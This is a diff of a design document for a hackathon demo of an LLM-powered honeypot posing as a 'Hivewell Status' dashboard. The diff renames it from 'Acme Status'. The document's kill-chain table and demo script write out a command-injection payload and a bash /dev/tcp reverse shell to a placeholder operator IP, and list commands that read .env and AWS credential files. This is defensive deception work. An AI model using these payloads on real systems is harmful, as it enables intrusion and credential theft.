@@ -10,7 +10,7 @@ Decisions: real reverse shell (one outbound connection, allowlisted to the opera
 
 ---
 
-## 1. The demo scenario: "Acme Status" internal dashboard
+## 1. The demo scenario: "Hivewell Status" internal dashboard
 
 The fake app looks like a small Next.js internal ops dashboard. The kill chain is short and classic, so judges recognize it right away:
 
@@ -20,7 +20,7 @@ The fake app looks like a small Next.js internal ops dashboard. The kill chain i
 | 2. Auth | Calls `/api/login` or uses the leaked token | `{"role":"admin"}` | Logged; the token is a honeytoken |
 | 3. Find the bug | `POST /api/admin/diagnostics {"host":"8.8.8.8"}` ("ping a host" tool) | Realistic `ping` output (LLM or template) | Nothing is executed |
 | 4. Confirm RCE | `{"host":"8.8.8.8; id"}` | ping output + `uid=1000(node) gid=1000(node) groups=1000(node)` | Injection detector splits off `id`; the shell brain answers |
-| 5. Get a shell | `{"host":"x; bash -c 'bash -i >& /dev/tcp/<OPERATOR_IP>/4444 0>&1'"}` | Their `nc -lvnp 4444` prints `connection received`, then `bash: no job control in this shell` and `node@acme-status-7f9c4:/app$` | Trap parses `/dev/tcp/IP/PORT`, checks the allowlist, **opens a real TCP connection**, and runs the LLM shell loop over it |
+| 5. Get a shell | `{"host":"x; bash -c 'bash -i >& /dev/tcp/<OPERATOR_IP>/4444 0>&1'"}` | Their `nc -lvnp 4444` prints `connection received`, then `bash: no job control in this shell` and `node@hivewell-status-7f9c4:/app$` | Trap parses `/dev/tcp/IP/PORT`, checks the allowlist, **opens a real TCP connection**, and runs the LLM shell loop over it |
 | 6. Post-exploitation | `whoami`, `ls -la`, `cat .env.production`, `cat ~/.aws/credentials`, `psql ...`, `find / -name "*.bak"` | A consistent fake box full of tempting breadcrumbs | Every command and reply goes to ClickHouse |
 | 7. Reveal | Presenter switches to the dashboard | Live ClickHouse timeline of every keystroke, a "time wasted" counter, and the Guild summary of TTPs | |
 
@@ -72,7 +72,7 @@ PRIVATE CONTROL SERVER
 - **Synthetic data only:** `world.json` is entirely made up, and all IPs in it are fake or reserved (e.g. 203.0.113.0/24, `*.invalid`).
 
 ## 4. Five-minute demo script
-1. (0:30) "This is Acme's internal status page." Teammate A (attacker) shares their terminal.
+1. (0:30) "This is Hivewell's internal status page." Teammate A (attacker) shares their terminal.
 2. (1:30) A finds the leaked token and the diagnostics endpoint, injects `; id`, and gets `uid=1000(node)`. Then A fires the reverse-shell payload, and the `nc` listener pops a shell.
 3. (1:30) A explores: `cat .env.production`, tries `psql`, which hangs, and finds the AWS creds: "jackpot".
 4. (1:00) Reveal: switch to the dashboard. Every command so far is in ClickHouse, attributed to `served_by=llm` or `fast_path`, with the time-wasted counter running. Click "Analyze" for the Guild summary with evidence IDs.
